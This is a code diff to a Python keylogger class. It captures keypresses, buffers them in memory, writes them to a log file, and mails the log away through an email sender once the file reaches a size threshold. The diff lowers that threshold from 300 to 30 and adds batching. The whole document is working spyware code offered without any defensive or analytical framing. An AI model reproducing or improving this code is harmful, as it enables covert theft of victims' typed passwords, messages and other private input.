@@ -13,6 +13,7 @@ encoding = 'UTF-8'
 class Keylogger:
     def __init__(self):
         self.write_time()
+        self.data = []
 
     def on_press(self, key):
         try:
@@ -27,9 +28,10 @@ class Keylogger:
 
     def write_file(self, key):
         d = len_file()
-        if len(d) >= 300:
+        if len(d) >= 30:
             try:
                 Email().sender(d)
+                print('send ')
                 delete_logs()
                 self.write_time()
             except Exception as er:
@@ -37,22 +39,29 @@ class Keylogger:
 
         else:
             try:
-                with open('log.txt', 'a+', encoding=encoding) as file:
-                    k = str(key).replace("'", "")
+                k = str(key).replace("'", "")
 
-                    if k.find("backspace") > 0:
-                        file.write('DELETE ')
+                if k.find("backspace") > 0:
+                    self.data.append('?')
 
-                    elif k.find("space") > 0:
-                        file.write(" ")
+                elif k.find("space") > 0:
+                    self.data.append(' ')
 
-                    elif k.find("enter") > 0:
-                        file.write('\n')
+                elif k.find("enter") > 0:
+                    self.data.append('\n')
 
-                    elif k.find("Key") == -1:
-                        file.write(k)
+                elif k.find("Key") == -1:
+                    self.data.append(key)
 
-                    file.flush()
+                else:
+                    self.data.append(key)
+
+                if len(self.data) >= 20:
+                    with open('log.txt', 'a+', encoding=encoding) as file:
+                        file.write(str(self.data))
+                        file.flush()
+                        self.data = []
+
             except Exception as er:
                 write_error(er)
 
@@ -60,6 +69,7 @@ class Keylogger:
         try:
             with open('log.txt', 'a+', encoding=encoding) as file:
                 file.write('\n' + '\n' + str(datetime.datetime.now()) + '\n')
+                file.flush()
         except Exception as er:
             write_error(er)
 
